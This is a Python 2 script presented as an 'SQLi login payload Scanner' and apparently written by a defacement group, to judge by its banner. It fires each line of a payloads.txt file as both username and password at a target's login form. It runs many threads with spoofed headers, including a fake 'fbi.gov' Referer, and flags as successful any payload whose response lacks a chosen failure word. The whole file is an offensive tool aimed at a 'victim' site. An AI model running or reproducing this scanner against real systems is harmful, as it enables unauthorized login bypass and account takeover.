#!/usr/bin/python 
# -*- coding: utf-8 -*-

import urllib
import urllib2
import re
import argparse
import sys
import threading
from termcolor import colored
from cookielib import CookieJar



request_headers = {
		
		"Accept-Language" : "en-US,en;q=0.5",
		"User-Agent"	  : "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
		"Accept"          : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Referer"         : "http://fbi.gov",
		"Connection"      : "keep-alive" 
}



about = colored("""
-----------------------------------------
--                                     --
-- SQLi login payload Scanner. v.2     --
--                                     --
-- Camoufl4g3                          --
--                                     --
-- Azdefacers.org                      --
-- Select the option -help for help    --
-----------------------------------------

""",'green')

#--------------------------------------------------- Scan function -------------------------------------------------

print about

lock = threading.Lock()

def PayloadScan(target,username,password,exception,payload):

	try:
		request  = urllib2.Request(target,headers=request_headers)
		cj       = CookieJar()
		opener   = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
		data     = urllib.urlencode({username:payload,password:payload})
		
		lock.acquire() #saxla
		try: 
			
			try:	
				u    = opener.open(target, data)
			except urllib2.HTTPError:
				sys.exit('Not valid url')
		except ValueError:
			sys.exit('Url is not true')
		

		lock.release() #sur emioglu
		getcode  = u.getcode()
		match    = re.findall(r'{}'.format(exception),u.read())

		if(match):
				print  " %s  %s" % (payload,colored('[-]','red'))  
		else:
				print  " %s  %s" % (payload,colored('[+]','green'))
	
	except KeyboardInterrupt:
		print 'stopped'
		



def Main():


	parser = argparse.ArgumentParser()

	parser.add_argument('-t',
                          action = "store", #stored
                          dest   = "target",
                          #type   = "string", #int tipi
                          help = "for example: ./payload.py -t victim.com")


	parser.add_argument('-uc',
                          action = "store", #stored
                          dest   = "uc",
                          #type   = "string", #int tipi
                          help = "for example: ./payload.py -uc username column")



	parser.add_argument('-pc',
                          action = "store", #stored
                          dest   = "pc",
                          #type   = "string", #int tipi
                          help = "for example: ./payload.py -pc password column")


	parser.add_argument('-exception',
                          action = "store", #stored
                          dest   = "exception",
                          #type   = "string", #int tipi
                          help = "for example: ./payload.py -a exception word")




	args   = parser.parse_args()

		

	target   = args.target

	print '--------------------------------------------'	

	if args.target is None:
		sys.exit('Url is empty')
	if args.target:
		print("# Creating target " + args.target)


	if args.uc:
		print("# Creating user column " + args.uc)


	if args.pc:
		print("# Creating password column " + args.pc)

	if args.exception:
		print("# Creating exception " + args.exception)	

	try: 
		f 		= open("payloads.txt","r")
	except IOError:
		sys.exit('File doesn\'t exist!')

	
	for line in f.readlines():
		 
         t = threading.Thread(target = PayloadScan, args = (target,args.uc,args.pc,args.exception,line.rstrip('\n')))
         t.start()
	

if __name__ == "__main__":
	Main()
